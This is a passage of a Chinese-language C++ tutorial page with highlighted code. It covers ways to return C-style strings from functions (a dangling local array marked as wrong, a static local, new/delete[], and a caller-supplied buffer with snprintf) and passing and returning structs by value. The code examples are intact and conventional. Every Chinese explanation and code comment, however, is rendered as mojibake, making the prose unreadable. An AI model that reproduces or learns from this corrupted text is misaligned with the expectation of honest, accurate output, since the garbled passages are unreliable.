æ˜¯å±€éƒ¨æ•°ç»„ï¼Œå‡½æ•°è¿”å›åå†…å­˜è¢«é‡Šæ”¾</span></span><br><span class="line">                 <span class="comment">// è¿”å›çš„æŒ‡é’ˆå°†æŒ‡å‘æ— æ•ˆå†…å­˜ (æ‚¬æŒ‚æŒ‡é’ˆ)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> è°ƒç”¨ <code>create_temp_string()</code> åå¾—åˆ°çš„æŒ‡é’ˆæ˜¯æ— æ•ˆçš„ï¼Œè§£å¼•ç”¨å®ƒä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚</li></ol><p><strong>å¯è¡Œçš„ï¼ˆä½†å„æœ‰ç¼ºç‚¹ï¼‰æ–¹å¼:</strong></p><ol><li><p><strong>è¿”å›æŒ‡å‘é™æ€å±€éƒ¨å˜é‡çš„æŒ‡é’ˆ:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨é™æ€å±€éƒ¨å˜é‡</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">get_static_message</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> message[] = <span class="string">&quot;Static Message&quot;</span>;</span><br><span class="line">    <span class="comment">// message åœ¨ç¨‹åºæ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å­˜åœ¨ï¼Œä½†åªæœ‰ä¸€ä¸ªå®ä¾‹</span></span><br><span class="line">    <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* msg1 = get_static_message();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Msg1: &quot;</span> &lt;&lt; msg1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Static Message</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœå‡½æ•°è¢«å†æ¬¡è°ƒç”¨ï¼Œå®ƒä¼šè¿”å›æŒ‡å‘ *åŒä¸€ä¸ª* é™æ€å†…å­˜çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="comment">// å¦‚æœå‡½æ•°å†…éƒ¨ä¿®æ”¹äº†é™æ€å˜é‡ï¼Œæ‰€æœ‰ä¹‹å‰çš„æŒ‡é’ˆéƒ½ä¼šçœ‹åˆ°å˜åŒ–</span></span><br><span class="line">    <span class="comment">// è¿™ç§æ–¹å¼ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* msg2 = get_static_message();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Msg2: &quot;</span> &lt;&lt; msg2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Static Message</span></span><br><span class="line">    <span class="comment">// msg1 å’Œ msg2 æŒ‡å‘åŒä¸€å—å†…å­˜</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>ç¼ºç‚¹:</strong> è¿”å›çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ¨åç»­è°ƒç”¨ä¸­å¯èƒ½è¢«è¦†ç›–ï¼ˆå¦‚æœå‡½æ•°ä¿®æ”¹é™æ€å˜é‡çš„è¯ï¼‰ï¼Œå¹¶ä¸”è¿™ç§æ–¹æ³•ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p></li><li><p><strong>è¿”å›æŒ‡å‘åŠ¨æ€åˆ†é…å†…å­˜çš„æŒ‡é’ˆ (<code>new</code>):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // ä¸ºäº† strcpy</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿”å›åŠ¨æ€åˆ†é…çš„å†…å­˜</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">create_dynamic_string</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* initial_value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* dynamic_str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(initial_value) + <span class="number">1</span>]; <span class="comment">// åˆ†é…å†…å­˜ (+1 for &#x27;\0&#x27;)</span></span><br><span class="line">    <span class="built_in">strcpy</span>(dynamic_str, initial_value); <span class="comment">// å¤åˆ¶å†…å®¹</span></span><br><span class="line">    <span class="keyword">return</span> dynamic_str; <span class="comment">// è¿”å›æŒ‡å‘æ–°åˆ†é…å†…å­˜çš„æŒ‡é’ˆ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* str1 = create_dynamic_string(<span class="string">&quot;Dynamic Data&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic String 1: &quot;</span> &lt;&lt; str1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// !!! é‡è¦ï¼šè°ƒç”¨è€…å¿…é¡»è´Ÿè´£é‡Šæ”¾å†…å­˜ !!!</span></span><br><span class="line">    <span class="keyword">delete</span>[] str1;</span><br><span class="line">    str1 = <span class="literal">nullptr</span>; <span class="comment">// å¥½ä¹ æƒ¯ï¼šé‡Šæ”¾åç½®ç©ºæŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* str2 = create_dynamic_string(<span class="string">&quot;More Data&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic String 2: &quot;</span> &lt;&lt; str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] str2;</span><br><span class="line">    str2 = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>ç¼ºç‚¹:</strong> è°ƒç”¨è€…å¿…é¡»è®°ä½ä½¿ç”¨ <code>delete[]</code> æ¥é‡Šæ”¾è¿”å›çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜ï¼Œå¦åˆ™ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚è¿™ç§è´£ä»»è½¬ç§»å¾ˆå®¹æ˜“å‡ºé”™ã€‚</p></li><li><p><strong>ä¼ é€’ç”±è°ƒç”¨è€…åˆ†é…çš„ç¼“å†²åŒº (æ¨èæ–¹å¼):</strong><br> è¿™æ˜¯æœ€å®‰å…¨ã€æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚å‡½æ•°æ¥å—ä¸€ä¸ªæŒ‡å‘è°ƒç”¨è€…æä¾›çš„ç¼“å†²åŒºçš„æŒ‡é’ˆå’Œè¯¥ç¼“å†²åŒºçš„å¤§å°ï¼Œç„¶åå°†ç»“æœå­—ç¬¦ä¸²å†™å…¥è¯¥ç¼“å†²åŒºã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // ä¸ºäº† strncpy</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å°†ç»“æœå†™å…¥è°ƒç”¨è€…æä¾›çš„ç¼“å†²åŒº</span></span><br><span class="line"><span class="comment">// è¿”å›å€¼å¯ä»¥æŒ‡ç¤ºæˆåŠŸ/å¤±è´¥æˆ–å†™å…¥çš„å­—ç¬¦æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">format_greeting</span><span class="params">(<span class="keyword">char</span> buffer[], <span class="keyword">size_t</span> buffer_size, <span class="keyword">const</span> <span class="keyword">char</span>* name)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ snprintf æˆ–å…¶ä»–å®‰å…¨å‡½æ•°æ¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡º</span></span><br><span class="line">    <span class="keyword">int</span> written = <span class="built_in">snprintf</span>(buffer, buffer_size, <span class="string">&quot;Hello, %s!&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ˜¯å¦æˆåŠŸä¸”æœªæˆªæ–­ (snprintf è¿”å›å€¼ç‰¹æ€§)</span></span><br><span class="line">    <span class="keyword">if</span> (written &gt; <span class="number">0</span> &amp;&amp; written &lt; buffer_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// æˆåŠŸ</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å¯èƒ½ç¼“å†²åŒºå¤ªå°æˆ–å‘ç”Ÿé”™è¯¯</span></span><br><span class="line">        <span class="keyword">if</span> (buffer_size &gt; <span class="number">0</span>) buffer[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// ç¡®ä¿ç¼“å†²åŒºä¸ºç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// å¤±è´¥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> BUF_SIZE = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">char</span> my_buffer[BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format_greeting(my_buffer, BUF_SIZE, <span class="string">&quot;Alice&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted Greeting: &quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Hello, Alice!</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to format greeting (buffer too small?)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format_greeting(my_buffer, <span class="number">10</span>, <span class="string">&quot;Bob The Builder&quot;</span>)) &#123; <span class="comment">// å°è¯•ç”¨å°ç¼“å†²åŒº</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted Greeting: &quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to format greeting (buffer too small?)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¿™å°†è¢«æ‰“å°</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer content after fail: \&quot;&quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: &quot;&quot; (å› ä¸ºå‡½æ•°æ¸…ç©ºäº†)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>ä¼˜ç‚¹:</strong> å†…å­˜ç®¡ç†ç”±è°ƒç”¨è€…è´Ÿè´£ï¼Œå‡½æ•°æœ¬èº«ä¸åˆ†é…å†…å­˜ï¼Œé¿å…äº†å†…å­˜æ³„æ¼å’Œæ‚¬æŒ‚æŒ‡é’ˆçš„é£é™©ã€‚å‡½æ•°æ¥å£æ¸…æ™°åœ°è¡¨æ˜äº†å…¶å¯¹ç¼“å†²åŒºçš„éœ€æ±‚ã€‚</p></li></ol><p><strong>æ€»ç»“:</strong></p><ul><li>  å°† C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼ é€’çš„æ˜¯ <code>char*</code>ï¼Œå‡½æ•°ä¾èµ– <code>\0</code> ç¡®å®šç»“æŸï¼Œä½¿ç”¨ <code>const char*</code> é˜²æ­¢æ„å¤–ä¿®æ”¹ã€‚</li><li>  è®©å‡½æ•°è¿”å› C-é£æ ¼å­—ç¬¦ä¸² (<code>char*</code>) æ¯”è¾ƒæ£˜æ‰‹ã€‚è¿”å›æŒ‡å‘å±€éƒ¨å˜é‡çš„æŒ‡é’ˆæ˜¯é”™è¯¯çš„ã€‚è¿”å›é™æ€å˜é‡æŒ‡é’ˆæœ‰å±€é™æ€§ã€‚è¿”å›åŠ¨æ€åˆ†é…å†…å­˜ (<code>new</code>) è¦æ±‚è°ƒç”¨è€…ç®¡ç†å†…å­˜ (<code>delete[]</code>)ã€‚</li><li>  æœ€å®‰å…¨ã€æœ€æ¨èçš„æ–¹å¼æ˜¯è®©è°ƒç”¨è€…æä¾›ç¼“å†²åŒºï¼Œå‡½æ•°å°†ç»“æœå†™å…¥è¯¥ç¼“å†²åŒºï¼Œå¹¶é€šå¸¸ä¼ é€’ç¼“å†²åŒºå¤§å°ä»¥é˜²æ­¢æº¢å‡ºã€‚</li><li>  åœ¨ç°ä»£ C++ ä¸­ï¼Œé€šå¸¸æ›´æ¨èä½¿ç”¨ <code>std::string</code> ç±»æ¥å¤„ç†å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒä¼šè‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œé¿å…äº†è®¸å¤šä¸ C-é£æ ¼å­—ç¬¦ä¸²ç›¸å…³çš„é™·é˜±ã€‚</li></ul><h2 id="7-6-å‡½æ•°å’Œç»“æ„"><a href="#7-6-å‡½æ•°å’Œç»“æ„" class="headerlink" title="7.6 å‡½æ•°å’Œç»“æ„"></a>7.6 å‡½æ•°å’Œç»“æ„</h2><p>ç»“æ„ (struct) æ˜¯ä¸€ç§ç”¨æˆ·å®šä¹‰çš„å¤åˆç±»å‹ï¼Œå¯ä»¥å°†ä¸åŒç±»å‹çš„æ•°æ®é¡¹ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„å®ä½“ã€‚ä¸åŸºæœ¬æ•°æ®ç±»å‹ä¸€æ ·ï¼Œç»“æ„ä¹Ÿå¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°ï¼Œå¹¶ä¸”å‡½æ•°ä¹Ÿå¯ä»¥è¿”å›ç»“æ„ç±»å‹çš„å€¼ã€‚</p><h3 id="7-6-1-ä¼ é€’å’Œè¿”å›ç»“æ„"><a href="#7-6-1-ä¼ é€’å’Œè¿”å›ç»“æ„" class="headerlink" title="7.6.1 ä¼ é€’å’Œè¿”å›ç»“æ„"></a>7.6.1 ä¼ é€’å’Œè¿”å›ç»“æ„</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç»“æ„ä¸åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚ <code>int</code>, <code>double</code>ï¼‰ä¸€æ ·ï¼Œæ˜¯<strong>æŒ‰å€¼ä¼ é€’ (Pass by Value)</strong> ç»™å‡½æ•°çš„ã€‚è¿™æ„å‘³ç€å½“å°†ä¸€ä¸ªç»“æ„å˜é‡ä½œä¸ºå®å‚ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå‡½æ•°ä¼šåˆ›å»ºè¯¥ç»“æ„çš„ä¸€ä¸ªå®Œæ•´<strong>å‰¯æœ¬</strong>ï¼ˆå½¢å‚ï¼‰ï¼Œå¹¶åœ¨å‡½æ•°å†…éƒ¨æ“ä½œè¿™ä¸ªå‰¯æœ¬ã€‚å¯¹å‰¯æœ¬æˆå‘˜çš„ä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå½±å“åŸå§‹ç»“æ„å˜é‡ã€‚</p><p>åŒæ ·ï¼Œå‡½æ•°ä¹Ÿå¯ä»¥å£°æ˜ä¸€ä¸ªç»“æ„ç±»å‹ä½œä¸ºå…¶<strong>è¿”å›ç±»å‹</strong>ã€‚å½“å‡½æ•°è¿”å›ä¸€ä¸ªç»“æ„æ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªè¯¥ç»“æ„çš„ä¸´æ—¶å‰¯æœ¬ï¼Œå¹¶å°†å…¶è¿”å›ç»™è°ƒç”¨è€…ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæŒ‰å€¼ä¼ é€’å’Œè¿”å›ç»“æ„</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // ä½¿ç”¨ string ç±»æˆå‘˜</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªç®€å•çš„ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šæŒ‰å€¼æ¥æ”¶ Point ç»“æ„ï¼Œå¹¶æ‰“å°å…¶åæ ‡</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_point</span><span class="params">(Point p)</span> </span>&#123; <span class="comment">// p æ˜¯ pt_main çš„å‰¯æœ¬</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying Point (inside function): (&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// ä¿®æ”¹å‰¯æœ¬çš„å€¼ï¼Œä¸ä¼šå½±å“åŸå§‹ç»“æ„</span></span><br><span class="line">    p.x = <span class="number">100.0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified copy inside function: (&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ Point ç»“æ„å¹¶æŒ‰å€¼è¿”å›</span></span><br><span class="line"><span class="function">Point <span class="title">create_point</span><span class="params">(<span class="keyword">double</span> x_val, <span class="keyword">double</span> y_val)</span> </span>&#123;</span><br><span class="line">    Point new_p;</span><br><span class="line">    new_p.x = x_val;</span><br><span class="line">    new_p.y = y_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating Point (&quot;</span> &lt;&lt; new_p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; new_p.y &lt;&lt; <span class="string">&quot;) inside create_point.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> new_p; <span class="comment">// è¿”å› Point ç»“æ„çš„å‰¯æœ¬</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Point pt_main = &#123;<span class="number">3.0</span>, <span class="number">4.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling display_point: (&quot;</span> &lt;&lt; pt_main.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_main.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// æŒ‰å€¼ä¼ é€’ pt_main</span></span><br><span class="line">    display_point(pt_main);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling display_point: (&quot;</span> &lt;&lt; pt_main.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_main.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åŸå§‹ç»“æ„æœªæ”¹å˜</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling create_point...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// æ¥æ”¶å‡½æ•°è¿”å›çš„ Point ç»“æ„å‰¯æœ¬</span></span><br><span class="line">    Point pt_returned = create_point(<span class="number">5.5</span>, <span class="number">-1.2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Returned Point in main: (&quot;</span> &lt;&lt; pt_returned.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_returned.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Before calling display_point: (3, 4)</span><br><span class="line">Displaying Point (inside function): (3, 4)</span><br><span class="line">Modified copy inside function: (100, 4)</span><br><span class="line">After calling display_point: (3, 4)</span><br><span class="line"></span><br><span class="line">Calling create_point...</span><br><span class="line">Creating Point (5.5, -1.2) inside create_point.</span><br><span class="line">Returned Point in main: (5.5, -1.2)</span><br></pre></td></tr></table></figure><p><strong>æŒ‰å€¼ä¼ é€’çš„ä¼˜ç¼ºç‚¹:</strong></p><ul><li>  <strong>ä¼˜ç‚¹:</strong> ä¿æŠ¤åŸå§‹æ•°æ®ä¸è¢«å‡½æ•°ä¿®æ”¹ï¼Œæ¦‚å¿µç®€å•ã€‚</li><li>  <strong>ç¼ºç‚¹:</strong> å¯¹äºåŒ…å«å¤§é‡æ•°æ®æˆå‘˜çš„ç»“æ„ï¼Œå¤åˆ¶æ•´ä¸ªç»“æ„å¯èƒ½æ•ˆç‡ä½ä¸‹ï¼Œæ¶ˆè€—æ—¶é—´å’Œå†…å­˜ã€‚</li></ul><h3 id="7-6-2-å¦ä¸€ä¸ªå¤„ç†ç»“æ„çš„å‡½æ•°ç¤ºä¾‹"><a href="#7-6-2-å¦ä¸€ä¸ªå¤„ç†ç»“æ„çš„å‡½æ•°ç¤ºä¾‹" class="headerlink" title="7.6.2 å¦ä¸€ä¸ªå¤„ç†ç»“æ„çš„å‡½æ•°ç¤ºä¾‹"></a>7.6.2 å¦ä¸€ä¸ªå¤„ç†ç»“æ„çš„å‡½æ•°ç¤ºä¾‹</h3><p>å‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥è®¡ç®—ä¸¤ä¸ªç‚¹ä¹‹é—´çš„ä¸­ç‚¹ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šè®¡ç®—ä¸¤ä¸ª Point çš„ä¸­ç‚¹ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„ Point</span></span><br><span class="line"><span class="function">Point <span class="title">find_midpoint</span><span class="params">(Point p1, Point 